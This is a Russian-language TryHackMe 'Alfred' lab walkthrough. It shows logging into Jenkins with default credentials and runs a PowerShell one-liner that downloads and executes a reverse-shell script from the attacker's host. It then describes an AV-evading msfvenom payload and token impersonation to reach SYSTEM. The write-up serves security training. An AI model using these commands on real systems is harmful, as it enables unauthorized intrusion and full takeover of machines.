# TryHackMe-Alfred


## Rustscan

```bash                                                                                                                      
PORT     STATE SERVICE    REASON          VERSION   
80/tcp   open  http       syn-ack ttl 127 Microsoft IIS httpd 7.5
| http-methods:                                                    
|   Supported Methods: OPTIONS TRACE GET HEAD POST                        
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5      
|_http-title: Site doesn't have a title (text/html).
3389/tcp open  tcpwrapped syn-ack ttl 127  
8080/tcp open  http       syn-ack ttl 127 Jetty 9.4.z-SNAPSHOT        
|_http-favicon: Unknown favicon MD5: 23E8C7BD78E8CD826C5A6073B15068B1     
| http-robots.txt: 1 disallowed entry                                     
|_/                                                                       
|_http-server-header: Jetty(9.4.z-SNAPSHOT)                               
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows                  
```

## PORT 80 (HTTP)

<img src="https://imgur.com/OzQMPUD.png"/>

Здесь мы не видим ничего интересного, поэтому давайте перейдем к другому http-порту

## PORT 8080 (HTTP)

<img src="https://imgur.com/aXHhYWT.png"/>

Мы видим портал входа в систему jenkins, поэтому давайте попробуем использовать учетные данные по умолчанию

`admin:password`

<img src="https://imgur.com/hrO4m40.png"/>

И это не сработало, давайте попробуем admin:admin

<img src="https://imgur.com/aFModUR.png"/>


Это сработало там, где мы находимся, теперь нам нужно найти, где мы можем выполнять команды, чтобы получить обратную оболочку на целевой машине

Наведите курсор мыши на project, и вы увидите выпадающее меню

 <img src="https://i.imgur.com/15CMp1p.png"/>
 
У Вас будут такие варианты, как "Changes", "Workspace", "Build Now", "Delete Project"," Configure" и "Rename". Выберем `Configure`:

<img src="https://imgur.com/msvm69Y.png"/>

Переключимся на `Build Environment Tab`:

<img src="https://i.imgur.com/yUPIbcb.png"/>

Здесь Вы можете видеть, что есть команда, написанная как  whoami, так что давайте нажмем "Применить" и сохранимся:

<img src="https://i.imgur.com/eXEBFF6.png"/>

Нажмем на `#2`, затем на `Console Output`

<img src="https://i.imgur.com/H0Bx0xH.png"/>

<img src="https://imgur.com/0S5GrCG.png"/>

И Вы можете видеть, какую бы команду мы там ни вводили, она покажет результат, так что теперь все, что мы можем сделать, это разместить сценарий обратной оболочки powershell, загрузить его с помощью powershell и выполнить функцию в сценарии, чтобы получить оболочку:

```
powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port
```

Запустите свой http-сервер python3

<img src="https://imgur.com/Ffh7FPk.png"/>

И наша команда будет выглядеть так: запустите прослушиватель netcat:

<img src="https://imgur.com/L7kRLea.png"/>

<img src="https://imgur.com/GGcjVVU.png"/>

Теперь нажмите `Build Now`, и это задание будет запущено, и Вы получите оболочку:

<img src="https://imgur.com/2LThZZr.png"/>

Сгенерируйте полезную нагрузку msfvenom с кодировщиками для обхода AV.
Разместите ее на своем локальном компьютере и загрузите, повторив тот же метод:


<img src="https://imgur.com/2px77nI.png"/>

Настройте свой прослушиватель metasploit

<img src="https://imgur.com/IKY1jka.png"/>

<img src="https://imgur.com/G6SR5wL.png"/>

<img src="https://i.imgur.com/uhZl5vx.png"/>

Запустите полезную нагрузку, и Вы увидите, что откроется сеанс meterpreter:

<img src="https://i.imgur.com/YF8AsSf.png"/>

Выполнив команду `getprivs`, мы можем увидеть, какие привилегии у нас есть на компьютере

<img src="https://i.imgur.com/zaqoz9K.png"/>

Здесь мы можем повысить наши привилегии с помощью `SeImpersonatePrivilege`.
Запустив команду `load incognito`, с помощью этого модуля мы можем выдавать себя за токены:


<img src="https://imgur.com/IbKIzYL.png"/>

<img src="https://imgur.com/macZDV5.png"/>

<img src="https://i.imgur.com/enPc6EW.png"/>

<img src="https://imgur.com/iE8Xsw7.png"/>

<img src="https://imgur.com/Ivy4Yaa.png"/>

Теперь, несмотря на то, что у нас есть SYSTEM на компьютере, мы все равно не сможем получить доступ к системным файлам, поскольку он использует основной токен процесса, а не олицетворенный токен, поэтому нам нужно перейти к процессу, запущенному от имени SYSTEM, который является `services.exe`:

<img src="https://i.imgur.com/ltPg2LG.png"/>

<img src="https://imgur.com/3P3tLr5.png"/>

<img src="https://imgur.com/h1cTVks.png"/>
